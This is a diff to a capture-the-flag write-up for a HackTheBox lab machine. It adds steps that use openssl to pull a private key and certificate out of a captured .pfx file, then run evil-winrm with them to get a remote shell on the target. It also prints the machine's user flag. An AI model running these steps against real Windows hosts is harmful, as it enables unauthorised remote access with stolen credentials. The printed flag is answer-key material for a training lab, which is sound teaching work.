@@ -152,7 +152,8 @@ For those who wonders why .pem (Privacy Enhanced Mail), because PEM file is a te
 encoded in the PEM format. The contents of a PEM file are encoded using Base64 encoding and are enclosed between
 "-----BEGIN CERTIFICATE-----" and "-----END CERTIFICATE-----" (or a similar marker depending on the type of data).
 
-However, the extension is not a must to .pem, can be anything. But I prefer .pem.
+However, the extension is not a must to .pem, can be anything. But I prefer .pem, because it helps me
+understand what type of file am I dealing with.
 ```
 
 ```
@@ -177,11 +178,43 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3db03f58-40fc-4959-87ba-59d9103e44a3)
 
 
-13. Great! Now let's also extract the certificate.
+13. Great! Now let's also extract the certificate (public key).
 
 ```
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cccb20ca-ee7c-4e27-a4af-0c73dc031de0)
+
+
+14. Now let's run **evil-winrm**.
 
 ```
+evil-winrm -i timelapse.htb -S -k key.pem -c cert.pem
+
+-i, represents which host to connect to.
+-S, represents that we want to enable SSL, because we are trying to connect to:
+
+5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+-k, represents the private key.
+-c, represents the public key.
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/496ba4c2-352d-4666-a429-9b664821a8b0)
+
+> GETTING USER FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0247e754-364e-4ec2-b3b6-eb6e82e696d4)
+
+
+## USER FLAG
+
+```
+3ddef02b88667a36cc86db0373cfd99a
+```
+
+
 
 
 ## IMPORTANT LINKS
